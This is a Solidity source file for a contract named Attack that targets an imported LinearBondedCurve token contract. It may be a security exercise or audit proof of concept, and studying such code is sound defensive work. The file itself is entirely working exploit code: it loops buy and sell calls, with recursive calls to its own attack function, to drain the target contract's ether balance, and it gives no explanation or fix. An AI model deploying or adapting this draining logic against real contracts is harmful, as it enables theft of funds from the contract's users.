// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./LinearBondedCurve.sol";

contract Attack {
    LinearBondedCurve c;

    constructor(LinearBondedCurve _contractAddress) {
        c = LinearBondedCurve(_contractAddress);
    }

    function deposit() external payable {}

    function buy() public payable {
        c.buy{value: address(this).balance}();
    }

    //At the end we get back our Eth but our token balance is not equal to 0
    function attack() public {
        if (tokenToEth(getTokenBalance()) > address(c).balance) {
            c.sell(ethToToken(address(c).balance));
        } else {
            c.sell(getTokenBalance());
            do {
                c.buy{value: address(this).balance}();
                attack();
            } while (address(c).balance > 0 && gasleft() > 150000);
        }
    }

    function ethToToken(uint256 _amount) public view returns (uint256) {
        return (1e18 * _amount) / (1e18 + getTotalSupply());
    }

    function tokenToEth(uint256 _amount) public view returns (uint256) {
        return ((1e18 + getTotalSupply()) * _amount) / 1e18;
    }

    function getTotalSupply() public view returns (uint256) {
        return c.totalSupply();
    }

    function getTokenBalance() public view returns (uint256) {
        return c.balances(address(this));
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
